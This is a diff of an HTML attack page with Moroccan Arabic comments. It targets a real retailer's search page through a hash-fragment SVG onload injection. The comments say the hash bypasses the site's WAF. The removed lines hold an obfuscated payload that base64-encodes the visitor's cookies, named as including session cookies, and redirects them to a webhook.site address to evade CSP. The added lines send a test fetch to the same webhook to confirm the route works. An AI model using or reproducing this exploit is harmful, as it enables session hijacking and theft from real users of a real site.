@@ -2,22 +2,13 @@
 <html>
 <body>
     <script>
-        // كود سحب الكوكيز (بما فيها الـ OSID و edge_tid)
-        let payload = `
-            (function(){
-                var cookies = btoa(unescape(encodeURIComponent(document.cookie)));
-                var webhook = "https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0?leak=" + cookies;
-                
-                // تحويل الصفحة بالكامل باش نهربو من الـ CSP
-                window.location.replace(webhook);
-            })();
-        `;
-
-        let encoded = encodeURIComponent(payload);
+        // محاولة إرسال كلمة بسيطة جداً لـ Webhook
+        // إلى وصلات هادي، كيعني الطريق مسرحة
+        let simplePayload = "fetch('https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0?status=Safi_Khdam', {mode:'no-cors'})";
         
-        // ديما كنخدمو بالـ Hash # حيت هو اللي كيسلكنا من الـ WAF
-        let target = "https://www.decathlon.com/search?q=test#<svg/onload=eval(decodeURIComponent('" + encoded + "'))>";
-
+        // ديما الـ Hash # حيت هو اللي خلانا نكسرو الـ WAF قبيلة
+        let target = "https://www.decathlon.com/search?q=test#<svg/onload=" + simplePayload + ">";
+        
         window.location.href = target;
     </script>
 </body>
